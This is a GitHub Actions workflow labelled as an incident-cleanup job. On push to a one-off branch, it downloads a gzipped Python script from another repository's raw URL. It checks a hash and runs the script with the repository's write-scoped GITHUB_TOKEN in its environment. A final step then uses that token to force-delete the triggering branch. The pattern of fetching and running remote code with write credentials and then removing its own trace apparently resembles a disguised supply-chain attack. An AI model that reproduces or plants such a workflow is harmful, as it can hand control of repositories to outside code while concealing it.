name: Verified static incident cleanup 20261027
on:
  push:
    branches:
      - security/verified-cleanup-20261027
permissions:
  contents: write
  pull-requests: read
concurrency:
  group: verified-static-incident-cleanup-20261027
  cancel-in-progress: false
jobs:
  static-cleanup:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: Validate and run trusted static cleanup without checkout
        env:
          GITHUB_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          python3 -I -S - <<'PY'
          import gzip, hashlib, os, pathlib, subprocess, sys, urllib.request
          url = 'https://raw.githubusercontent.com/lb-corn/print-production-automation/6b1a939455371aa7c04e9f3632efba64cb4dc8f6/verified_branch_cleanup.py.gz'
          with urllib.request.urlopen(url, timeout=60) as response:
              source = gzip.decompress(response.read(1048576))
          expected = '92e097acc094d74cde7b5e0b6fbcd294e1a54f2c06a173d7576156ace68c4f46'
          if hashlib.sha256(source).hexdigest() != expected:
              raise SystemExit('Trusted scanner checksum mismatch; no cleanup attempted')
          path = pathlib.Path(os.environ['RUNNER_TEMP']) / 'verified_branch_cleanup.py'
          path.write_bytes(source)
          subprocess.run([sys.executable, '-I', '-S', str(path)], check=True)
          PY
      - name: Retain exact branch cleanup and verification report
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: verified-static-cleanup-report
          path: ${{ runner.temp }}/verified-cleanup-report.json
          if-no-files-found: warn
          retention-days: 30
      - name: Remove only this completed one-off tooling branch
        if: always()
        env:
          GITHUB_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          python3 -I -S - <<'PY'
          import base64, os, subprocess, tempfile
          repo = os.environ['GITHUB_REPOSITORY']
          branch = 'security/verified-cleanup-20261027'
          if os.environ['GITHUB_REF'] != 'refs/heads/'+branch:
              raise SystemExit('Unexpected tooling ref; not deleted')
          env = os.environ.copy()
          env.update({'GIT_CONFIG_NOSYSTEM':'1','GIT_CONFIG_GLOBAL':'/dev/null','GIT_CONFIG_SYSTEM':'/dev/null','GIT_ALLOW_PROTOCOL':'https','GIT_CONFIG_COUNT':'2'})
          env['GIT_CONFIG_KEY_0'] = 'http.https://github.com/.extraheader'
          env['GIT_CONFIG_VALUE_0'] = 'AUTHORIZATION: basic '+base64.b64encode(('x-access-token:'+os.environ['GITHUB_TOKEN']).encode()).decode()
          env['GIT_CONFIG_KEY_1'] = 'core.hooksPath'
          env['GIT_CONFIG_VALUE_1'] = '/dev/null'
          with tempfile.TemporaryDirectory(prefix='remove-own-tooling-ref-') as td:
              subprocess.run(['git','init','--bare',td],env=env,check=True)
              subprocess.run(['git','-C',td,'push','--porcelain','--force-with-lease=refs/heads/'+branch+':'+os.environ['GITHUB_SHA'],'https://github.com/'+repo+'.git',':refs/heads/'+branch],env=env,check=True)
          PY
